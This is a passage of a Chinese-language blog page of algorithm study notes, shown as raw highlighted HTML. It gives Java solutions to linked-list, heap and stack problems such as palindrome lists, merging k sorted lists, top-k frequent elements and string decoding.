ListNode <span class="title">reverseList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="keyword">null</span> || head.next == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode last = reverseList(head.next);</span><br><span class="line">        head.next.next = head;</span><br><span class="line">        head.next = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">return</span> last;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="2-9-回文链表"><a href="#2-9-回文链表" class="headerlink" title="2.9 回文链表"></a>2.9 回文链表</h2><p>链表后序遍历：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> ListNode left;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        left = head;</span><br><span class="line">        <span class="keyword">return</span> traverse(head);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">traverse</span><span class="params">(ListNode right)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (right == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">boolean</span> res = traverse(right.next);</span><br><span class="line">    <span class="comment">// 后序遍历代码,右边无res的话比较的是当前对称节点是否相同而无法记录前面的结果</span></span><br><span class="line">    res = res &amp;&amp; (right.val == left.val);</span><br><span class="line">    left = left.next;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种解法相当于链表反转和原链表比较，会占用O(N)的空间复杂度。</p><p>可以将前半段链表和反转后半段链表比较，这样不会占用格外的空间。关键是利用快慢指针找到链表中点。</p><p>优化空间复杂度：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/3.jpg" alt="3" style="zoom:50%;" /></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        ListNode fast = head,slow = head;</span><br><span class="line">        <span class="keyword">while</span>(fast != <span class="keyword">null</span> &amp;&amp; fast.next != <span class="keyword">null</span>)&#123;</span><br><span class="line">            fast  = fast.next.next;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//fast == null 链表为奇数，slow为中点</span></span><br><span class="line">        <span class="comment">//fast != null 链表偶数，slow再走一步</span></span><br><span class="line">        <span class="keyword">if</span>(fast != <span class="keyword">null</span>)&#123;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode right = reverse(slow);</span><br><span class="line">    <span class="comment">//一定要使用right，因为left和right不是完全相同，当链表节点个数为奇数，中点没有参与判断</span></span><br><span class="line">        <span class="keyword">while</span>(right != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(right.val != head.val)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            right = right.next;</span><br><span class="line">            head = head.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//反转链表</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> ListNode <span class="title">reverse</span><span class="params">(ListNode head)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="keyword">null</span> || head.next == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode tmp = <span class="keyword">null</span>;</span><br><span class="line">        ListNode node = head.next;</span><br><span class="line">        head.next = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(node.next != <span class="keyword">null</span>)&#123;</span><br><span class="line">            tmp = node.next;</span><br><span class="line">            node.next = head;</span><br><span class="line">            head = node;</span><br><span class="line">            node = tmp;            </span><br><span class="line">        &#125;</span><br><span class="line">        node.next = head;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="2-10-合并k个升序链表"><a href="#2-10-合并k个升序链表" class="headerlink" title="2.10 合并k个升序链表"></a>2.10 合并k个升序链表</h2><p>两两合并，借助归并排序的递归分治思想</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">mergeKLists</span><span class="params">(ListNode[] lists)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length = lists.length;</span><br><span class="line">        <span class="keyword">if</span>(lists == <span class="keyword">null</span> || length == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> merge(lists,<span class="number">0</span>,length - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> ListNode <span class="title">merge</span><span class="params">(ListNode[] lists, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (left == right) <span class="keyword">return</span> lists[left];</span><br><span class="line">        <span class="keyword">int</span> mid = left + (right - left) / <span class="number">2</span>;</span><br><span class="line">        ListNode l1 = merge(lists, left, mid);</span><br><span class="line">        ListNode l2 = merge(lists, mid + <span class="number">1</span>, right);</span><br><span class="line">        <span class="keyword">return</span> mergeTwoLists(l1, l2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//两个有序链表合并</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">mergeTwoLists</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//合并链表头节点</span></span><br><span class="line">        ListNode head = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">//特殊情况</span></span><br><span class="line">        <span class="keyword">if</span>(l1 == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> l2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(l2 == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> l1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//选出头节点</span></span><br><span class="line">        <span class="keyword">if</span>(l1.val &lt;= l2.val)&#123;</span><br><span class="line">            head = l1;</span><br><span class="line">            l1 = l1.next;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            head = l2;</span><br><span class="line">            l2 = l2.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//迭代比较合并</span></span><br><span class="line">        ListNode l = head;</span><br><span class="line">        <span class="keyword">while</span>(l1 != <span class="keyword">null</span> || l2 != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(l1 == <span class="keyword">null</span>)&#123;</span><br><span class="line">                l.next = l2;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(l2 == <span class="keyword">null</span>)&#123;</span><br><span class="line">                l.next = l1;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(l1.val &lt;= l2.val)&#123;</span><br><span class="line">                l.next = l1;</span><br><span class="line">                l = l.next;</span><br><span class="line">                l1 = l1.next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                l.next = l2;</span><br><span class="line">                l = l.next;</span><br><span class="line">                l2 = l2.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>优先队列思想：</p><p>借助Java默认实现的PriorityQueue小根堆将所有结点都放在小根堆，每次取出的都是最小值。</p><p>不断地从小到大取出并连接</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">mergeKLists</span><span class="params">(ListNode[] lists)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length = lists.length;</span><br><span class="line">        <span class="keyword">if</span>(lists == <span class="keyword">null</span> || length == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        PriorityQueue&lt;ListNode&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;&gt;(lists.length, <span class="keyword">new</span> Comparator&lt;ListNode&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(ListNode o1, ListNode o2)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (o1.val &lt; o2.val) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (o1.val == o2.val) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        ListNode dummy = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        ListNode p = dummy;</span><br><span class="line">        <span class="keyword">for</span> (ListNode node : lists) &#123;</span><br><span class="line">            <span class="keyword">if</span> (node != <span class="keyword">null</span>) queue.add(node);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">            p.next = queue.poll();</span><br><span class="line">            p = p.next;</span><br><span class="line">            <span class="keyword">if</span> (p.next != <span class="keyword">null</span>) queue.add(p.next);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="3-堆"><a href="#3-堆" class="headerlink" title="3. 堆"></a>3. 堆</h1><h2 id="3-1-数组中的第K个最大元素"><a href="#3-1-数组中的第K个最大元素" class="headerlink" title="3.1 数组中的第K个最大元素"></a>3.1 数组中的第K个最大元素</h2><p>使用内置排序方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findKthLargest</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    Arrays.sort(nums);</span><br><span class="line">    <span class="keyword">return</span> nums[nums.length - k];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用堆：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findKthLargest</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    Queue&lt;Integer&gt; pq = <span class="keyword">new</span> PriorityQueue&lt;&gt;((v1,v2)-&gt;(v2-v1));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> num : nums)&#123;</span><br><span class="line">        pq.add(num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(k-- &gt; <span class="number">1</span>)&#123;</span><br><span class="line">        pq.poll();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pq.poll();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-2-前-K-个高频元素"><a href="#3-2-前-K-个高频元素" class="headerlink" title="3.2 前 K 个高频元素"></a>3.2 前 K 个高频元素</h2><p>值得注意的是遍历hashmap的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(Map.Entry&lt;Integer, Integer&gt; set : map.entrySet())</span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] topKFrequent(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k) &#123;</span><br><span class="line">    HashMap&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> num : nums)&#123;</span><br><span class="line">        map.put(num,map.getOrDefault(num,<span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PriorityQueue&lt;<span class="keyword">int</span>[]&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;<span class="keyword">int</span>[]&gt;(<span class="keyword">new</span> Comparator&lt;<span class="keyword">int</span>[]&gt;() &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(<span class="keyword">int</span>[] m, <span class="keyword">int</span>[] n)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> m[<span class="number">1</span>] - n[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">for</span>(Map.Entry&lt;Integer, Integer&gt; set : map.entrySet())&#123;</span><br><span class="line">        <span class="keyword">int</span> num = set.getKey(), count = set.getValue();</span><br><span class="line">        <span class="keyword">if</span>(queue.size() &lt; k)&#123;</span><br><span class="line">            queue.offer(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;num, count&#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(count &gt; queue.peek()[<span class="number">1</span>])&#123;</span><br><span class="line">                queue.poll();</span><br><span class="line">                queue.offer(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;num, count&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">          <span class="keyword">int</span>[] ret = <span class="keyword">new</span> <span class="keyword">int</span>[k];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; ++i) &#123;</span><br><span class="line">        ret[i] = queue.poll()[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="4-栈-队列"><a href="#4-栈-队列" class="headerlink" title="4. 栈/队列"></a>4. 栈/队列</h1><h2 id="4-1-有效的括号"><a href="#4-1-有效的括号" class="headerlink" title="4.1 有效的括号"></a>4.1 有效的括号</h2><p>注意java里面栈的结构是双端队列Deque</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValid</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = s.length();</span><br><span class="line">    <span class="keyword">if</span>(n % <span class="number">2</span> == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    HashMap&lt;Character, Character&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;(&#x27;</span>);</span><br><span class="line">    map.put(<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;[&#x27;</span>);</span><br><span class="line">    map.put(<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>); </span><br><span class="line"></span><br><span class="line">    Deque&lt;Character&gt; stack = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        <span class="keyword">char</span> c = s.charAt(i);</span><br><span class="line">        <span class="keyword">if</span>(map.containsKey(c))&#123;</span><br><span class="line">            <span class="keyword">if</span>(stack.isEmpty() || map.get(c) != stack.peek())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            stack.pop();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            stack.push(c);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stack.isEmpty();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-2-最小栈"><a href="#4-2-最小栈" class="headerlink" title="4.2 最小栈"></a>4.2 最小栈</h2><p>同剑指offer包含min函数的最小栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MinStack</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** initialize your data structure here. */</span></span><br><span class="line">    Stack&lt;Integer&gt; stack1,stack2;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MinStack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        stack1 = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">        stack2 = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        stack1.add(x);</span><br><span class="line">        <span class="keyword">if</span>(stack2.empty() || stack2.peek() &gt;= x)&#123;</span><br><span class="line">            stack2.add(x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (stack1.pop().equals(stack2.peek()))&#123;</span><br><span class="line">            stack2.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> stack1.peek();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getMin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> stack2.peek();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-3-字符串解码"><a href="#4-3-字符串解码" class="headerlink" title="4.3 字符串解码"></a>4.3 字符串解码</h2><ul><li><p>注意Character的内置方法判别数字和字母</p></li><li><p>LinkedList作为栈的好处是方便逆置</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> ptr = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">decodeString</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    LinkedList&lt;String&gt; stack = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">while</span>(ptr &lt; s.length())&#123;</span><br><span class="line">        <span class="keyword">char</span> cur = s.charAt(ptr);</span><br><span class="line">        <span class="keyword">if</span>(Character.isDigit(cur))&#123;</span><br><span class="line">            String digits = getDigits(s);</span><br><span class="line">            stack.addLast(digits);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(Character.isLetter(cur) || cur == <span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">            stack.addLast(String.valueOf(s.charAt(ptr++))); </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            ++ptr;</span><br><span class="line">            LinkedList&lt;String&gt; sub = <span class="keyword">new</span> LinkedList&lt;String&gt;();</span><br><span class="line">            <span class="keyword">while</span> (!<span class="string">&quot;[&quot;</span>.equals(stack.peekLast())) &#123;</span><br><span class="line">                sub.addLast(stack.removeLast());</span><br><span class="line">            &#125;</span><br><span class="line">            Collections.reverse(sub);</span><br><span class="line">            <span class="comment">// 左括号出栈</span></span><br><span class="line">            stack.removeLast();</span><br><span class="line">            <span class="comment">// 此时栈顶为当前 sub 对应的字符串应该出现的次数</span></span><br><span class="line">            <span class="keyword">int</span> repTime = Integer.parseInt(stack.removeLast());</span><br><span class="line">            StringBuilder t = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            String o = getString(sub);</span><br><span class="line">            <span class="comment">// 构造字符串</span></span><br><span class="line">            <span class="keyword">while</span> (repTime-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                t.append(o);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 将构造好的字符串入栈</span></span><br><span class="line">            stack.addLast(t.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> getString(stack);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">String <span class="title">getDigits</span><span class="params">(String s)</span></span>&#123;</span><br><span class="line">    StringBuilder nums = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">while</span>(Character.isDigit(s.charAt(ptr)))&#123;</span><br><span class="line">        nums.append(s.charAt(ptr++));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums.toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">String <span class="title">getString</span><span class="params">(LinkedList&lt;String&gt; v)</span> </span>&#123;</span><br><span class="line">    StringBuffer ret = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">    <span class="keyword">for</span> (String s : v) &#123;</span><br><span class="line">        ret.append(s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-4-每日温度"><a href="#4-4-每日温度" class="headerlink" title="4.4 每日温度"></a>4.4 每日温度</h2><p>单调栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] dailyTemperatures(<span class="keyword">int</span>[] T) &#123;</span><br><span class="line">    <span class="comment">//答案数组</span></span><br><span class="line">    <span class="keyword">int</span>[] res = <span class="keyword">new</span> <span class="keyword">int</span>[T.length];</span><br><span class="line">    <span class="comment">//单调栈</span></span><br><span class="line">    LinkedList&lt;Integer&gt; stack = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span 